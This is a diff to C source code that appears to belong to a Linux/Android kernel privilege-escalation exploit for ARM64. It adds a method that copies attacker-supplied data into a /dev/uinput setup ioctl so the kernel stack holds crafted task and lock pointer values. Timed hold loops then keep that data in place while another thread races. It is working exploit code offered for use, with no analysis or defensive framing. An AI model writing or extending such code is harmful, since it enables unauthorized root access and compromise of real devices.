@@ -115,12 +115,13 @@ static void *stamp_udp_flood(void *unused) {
 
 static const int g_stamp_nfds = STAMP_NFDS;
 static const int g_stamp_waiter_off = STAMP_WAITER_OFF;
-/* 0: IPv6 setsockopt, 1: compat select, 2: native IPv4 ping setsockopt. */
 enum stamp_method {
     STAMP_METHOD_IPV6_SETSOCKOPT = 0,
     STAMP_METHOD_COMPAT_SELECT = 1,
     STAMP_METHOD_IPV4_PING_SETSOCKOPT = 2,
+    STAMP_METHOD_UINPUT = 3,
 };
+#define STAMP_METHOD_UINPUT_ID 3
 
 static const int g_stamp_method = STAMP_VIA_SELECT;
 static const int g_stamp_socktype = STAMP_SOCKTYPE;
@@ -229,7 +230,103 @@ static void stamp_select(uint64_t *buf) {
     }
 }
 
+#if STAMP_VIA_SELECT == STAMP_METHOD_UINPUT_ID
+#include <sys/ioctl.h>
+
+#ifndef UI_DEV_SETUP_REQ
+#define UI_DEV_SETUP_REQ 0x405c5503UL
+#endif
+#ifndef UINPUT_SETUP_BYTES
+#define UINPUT_SETUP_BYTES 92
+#endif
+#ifndef STAMP_UINPUT_PAYLOAD_BYTES
+#define STAMP_UINPUT_PAYLOAD_BYTES 80
+#endif
+#ifndef STAMP_UINPUT_HOLD_MS
+#define STAMP_UINPUT_HOLD_MS 3000
+#endif
+#ifndef STAMP_UINPUT_HOLD_ROUNDS
+#define STAMP_UINPUT_HOLD_ROUNDS 8
+#endif
+
+int g_uinput_fd = -1;
+
+void stamp_uinput_open(void) {
+    if (g_uinput_fd >= 0)
+        return;
+    errno = 0;
+    g_uinput_fd = open("/dev/uinput", O_RDWR | O_NONBLOCK);
+    if (g_uinput_fd < 0)
+        pr_warning("Stamp: /dev/uinput open failed errno=%d\n", errno);
+    else
+        pr_info("Stamp: uinput carrier fd=%d\n", g_uinput_fd);
+}
+
+static void stamp_uinput(uint64_t *buf) {
+    if (g_uinput_fd < 0)
+        stamp_uinput_open();
+    if (g_uinput_fd < 0) {
+        pr_error("Stamp: uinput carrier unavailable\n");
+        atomic_store(&g_consumer_go, 1);
+        return;
+    }
+
+    unsigned char setup[UINPUT_SETUP_BYTES];
+    memset(setup, 0, sizeof(setup));
+    memcpy(setup, buf, STAMP_UINPUT_PAYLOAD_BYTES);
+
+    pr_debug("Stamp: uinput task=%#llx lock=%#llx pi_left=%#llx\n",
+             (unsigned long long)buf[6], (unsigned long long)buf[7],
+             (unsigned long long)buf[5]);
+
+    errno = 0;
+    int rc = ioctl(g_uinput_fd, UI_DEV_SETUP_REQ, setup);
+    atomic_store(&g_stamp_last_rc, rc);
+    atomic_store(&g_stamp_last_errno, errno);
+    atomic_store(&g_stamp_completed, 1);
+
+    atomic_store(&g_consumer_go, 1);
+
+    uint64_t cnt_freq = 0, t0 = 0, t_start = 0, t_now = 0;
+    __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(cnt_freq));
+    if (!cnt_freq)
+        cnt_freq = 19200000ULL;
+    const uint64_t budget = cnt_freq / 1000ULL * (uint64_t)STAMP_UINPUT_HOLD_MS;
+    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(t0));
+
+    int hold_rounds = 0;
+    for (; hold_rounds < STAMP_UINPUT_HOLD_ROUNDS; hold_rounds++) {
+        __asm__ volatile("mrs %0, cntvct_el0" : "=r"(t_start));
+        for (;;) {
+            if (atomic_load(&g_consumer_done))
+                break;
+            __asm__ volatile("mrs %0, cntvct_el0" : "=r"(t_now));
+            if (t_now - t_start >= budget)
+                break;
+        }
+        if (atomic_load(&g_consumer_done))
+            break;
+        ioctl(g_uinput_fd, UI_DEV_SETUP_REQ, setup);
+    }
+    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(t_now));
+
+    pr_info("Stamp: hold ended rounds=%d wait_us=%llu\n", hold_rounds,
+            (unsigned long long)((t_now - t0) * 1000000ULL / cnt_freq));
+
+    for (int i = 0; i < 200; i++) {
+        if (atomic_load(&g_consumer_done))
+            break;
+        usleep(1000);
+    }
+}
+#endif
+
 void prepare_stamp_hold(uint64_t *buf) {
+#if STAMP_VIA_SELECT == STAMP_METHOD_UINPUT_ID
+    (void)buf;
+    stamp_uinput_open();
+    return;
+#endif
 #ifdef STAMP_PING_SOURCE_HOLD
     if (buf[STAMP_SOURCE_SKIP_WORD]) {
         pr_info("Stamp: reusing parked ping source-list holders\n");
@@ -561,10 +658,14 @@ static void stamp_setsockopt(uint64_t *buf) {
 }
 
 void do_stamp_stack(uint64_t *buf) {
+#if STAMP_VIA_SELECT == STAMP_METHOD_UINPUT_ID
+    stamp_uinput(buf);
+#else
     if (g_stamp_method == STAMP_METHOD_COMPAT_SELECT)
         stamp_select(buf);
     else
         stamp_setsockopt(buf);
+#endif
 }
 
 void log_stamp_config(void) {
